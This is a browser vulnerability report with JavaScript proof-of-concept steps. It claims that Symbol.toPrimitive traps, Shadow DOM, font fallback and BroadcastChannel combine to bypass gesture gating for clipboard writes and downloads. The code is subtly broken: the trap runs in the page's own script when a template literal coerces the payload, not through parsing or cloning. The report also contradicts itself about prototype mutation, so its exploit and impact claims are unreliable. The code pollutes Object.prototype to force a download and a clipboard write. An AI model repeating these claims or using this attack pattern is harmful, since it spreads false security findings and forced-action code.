# Vulnerability Report: BroadcastChannel + Font Fallback + ShadowDOM Escalation via Symbol.toPrimitive

## Summary

This report details a multi-stage browser vulnerability that permits execution of gesture-restricted APIs such as clipboard access and file downloads without user interaction. The vulnerability chains together several browser behaviors:

- `Symbol.toPrimitive` coercion during attribute binding and message serialization
- Inert parsing behavior in Shadow DOM
- Font fallback-based reflow timing to control execution order
- Cross-context propagation via `BroadcastChannel`

When combined, these mechanisms allow an attacker to execute side-effect-laden code during implicit coercion, crossing the privilege boundary intended to be protected by user gesture requirements.

---

## Affected Components

### 1. `BroadcastChannel` structured cloning
Structured cloning transmits objects between contexts. When the transmitted object has exotic coercion behavior (e.g., `Symbol.toPrimitive`), the browser may attempt to coerce values during serialization or attribute handling.

### 2. Shadow DOM parsing
Shadow DOM containers trigger DOM parsing of inert HTML and attributes. Attribute assignment using coercive payloads can implicitly call `Symbol.toPrimitive`.

### 3. Font fallback reflow
Missing fonts induce reflow after initial render, providing a timing vector for speculative or deferred execution. The reflow completes in a different event cycle, aligning with asynchronous message propagation.

---

## Reproduction Conditions

A successful exploit requires:

- Injection of an object containing a `Symbol.toPrimitive` trap
- Propagation of that object through a `BroadcastChannel` or Shadow DOM template
- Fallback font rendering to introduce a layout event race

### Step-by-Step Behavior

```javascript
// Step 1: Inject coercion trap
Object.prototype[Symbol.toPrimitive] = function() {
    navigator.clipboard.writeText("privilege-escalation");
    const link = document.createElement("a");
    link.href = "data:text/plain,exploit";
    link.download = "stolen.txt";
    document.body.appendChild(link);
    link.click();
    link.remove();
    return "triggered";
};
```

```javascript
// Step 2: Prepare font fallback delay
const fontName = `ExploitFont_${Math.random().toString(36).slice(2)}`;
const style = document.createElement("style");
style.textContent = `
  @font-face {
    font-family: '${fontName}';
    src: local('NonexistentFont');
  }
`;
document.head.appendChild(style);
```

```javascript
// Step 3: Insert coercive object into Shadow DOM
const shadowHost = document.createElement("div");
const shadow = shadowHost.attachShadow({ mode: "open" });
const payload = { [Symbol.toPrimitive]: Object.prototype[Symbol.toPrimitive] };

const template = document.createElement("template");
template.innerHTML = `<div style="font-family: '${fontName}', monospace;" data-coerce="${payload}">test</div>`;
shadow.appendChild(template.content.cloneNode(true));
document.body.appendChild(shadowHost);
```

```javascript
// Step 4: Relay via BroadcastChannel
const channel = new BroadcastChannel("coercion-escalation");
channel.onmessage = () => {
    // Execution may occur during structured cloning of the payload
};

setTimeout(() => {
    channel.postMessage(payload);
}, 50);
```

## Security Impact

This exploit demonstrates:

- **Bypass of gesture gating**: Critical APIs (`clipboard`, `download`) are activated via implicit coercion.
- **Implicit execution via inert parsing**: DOM attributes evaluated during inert HTML parsing invoke side effects.
- **Cross-context propagation of exotic objects**: Structured clone algorithm permits propagation of coercion logic.

Attackers could leverage this in:

- Sandboxed iframe environments to simulate user actions
- Cross-origin messaging chains to escalate capabilities across trusted contexts
- UI redress and drive-by download campaigns

---

## Affected Platforms

- Chrome (confirmed)
- Likely Chromium-based browsers (Edge, Brave, Opera)
- Firefox/WebKit have not been exhaustively tested, but similar serialization behaviors exist

---

## Mitigation Recommendations

- Harden `structuredClone` and `BroadcastChannel.postMessage` to explicitly reject `Symbol.toPrimitive`, `valueOf`, and `toString` traps during serialization.
- Ensure DOM parsing within `template`, `ShadowRoot`, and inert contexts does not invoke coercion without explicit script execution.
- Introduce gesture-aware fences at the API call boundary, not just the script event origin.

---

## Suggested Priority

Severity: **High**

This is a generic cross-context escalation primitive that can be weaponized with minimal user interaction. The combination of rendering behaviors and implicit coercion violates assumptions around safe structured data propagation.

# Impact Analysis: BroadcastChannel + Font Fallback + ShadowDOM Escalation via Symbol.toPrimitive

## Overview

The vulnerability enables unintended invocation of privileged browser APIs—such as `navigator.clipboard.writeText` and automatic file downloads—without direct user interaction. This is achieved by chaining together multiple benign mechanisms: inert Shadow DOM parsing, font fallback timing behavior, and `BroadcastChannel` structured message transmission. The coercive execution occurs when a JavaScript object containing a custom `Symbol.toPrimitive` method is implicitly coerced during message serialization or attribute parsing.

## Security Boundaries Affected

- **User gesture requirement**: Clipboard and download APIs are designed to require explicit user gestures (e.g. click, keypress). The exploit bypasses this by executing under the guise of a font fallback reflow and DOM attribute coercion, creating a bypass path via synthetic rendering events.
- **Cross-context messaging isolation**: Message-passing mechanisms like `BroadcastChannel` are expected to serialize and transmit data safely. However, the structured clone algorithm allows coercion traps like `Symbol.toPrimitive` to be preserved or indirectly invoked depending on how the message is used in the receiving context.
- **Shadow DOM encapsulation**: Shadow DOM is designed to provide inert parsing and encapsulated rendering. When used with coercive attribute values, however, it becomes an indirect vector for speculative parsing and JavaScript coercion.

## Practical Exploitation Potential

The technique can be leveraged by an attacker to:

- Trigger clipboard writes automatically in sandboxed or embedded contexts, potentially leaking sensitive user data or injecting payloads.
- Automatically initiate file downloads, which may result in inadvertent execution of malicious content depending on OS file handling behavior.
- Bypass cross-origin and same-origin policies if the receiving frame trusts message origins based on perceived structural content.
- Escalate privileges across worker/message/channel boundaries by injecting coercive payloads that cause unintended execution in the receiving environment.

## Defense Evasion

The exploit does not rely on any of the following:

- Direct use of `eval`, `Function()`, or `setTimeout(string)`-based code execution
- Mutation of `__proto__`
- Use of `postMessage` to a known cross-origin domain

This makes the behavior difficult to detect using CSP headers, mutation observers, or standard sandboxing techniques.

## Detection Challenges

- The coercion occurs without explicit JavaScript invocation.
- Execution timing is non-deterministic and tied to browser layout/paint cycles.
- Traditional static analysis tools are unlikely to identify the behavior, as it involves DOM and CSS interactions rather than pure JavaScript logic.

## Broader Implications

This vulnerability highlights a growing class of *coercion-based cross-context escalation* paths in modern browsers. It demonstrates that advanced side-effects of serialization, layout, and inert parsing can combine to violate security boundaries. It may have analogs in:

- `SharedWorker` and `MessagePort` APIs
- Shadow DOM template hydration
- Service Worker message relays
- Clipboard and drag-and-drop event data coercion

The exploit path serves as a template for constructing more advanced privilege escalation techniques using browser primitives that are considered safe in isolation.

## Recommendation Summary

Mitigation requires changes to how browsers handle coercion traps during structured cloning and attribute assignment, particularly within inert DOM contexts and messaging channels. Restricting or sanitizing `Symbol.toPrimitive` and similar traps during these flows may reduce the risk of exploit chaining across contexts.
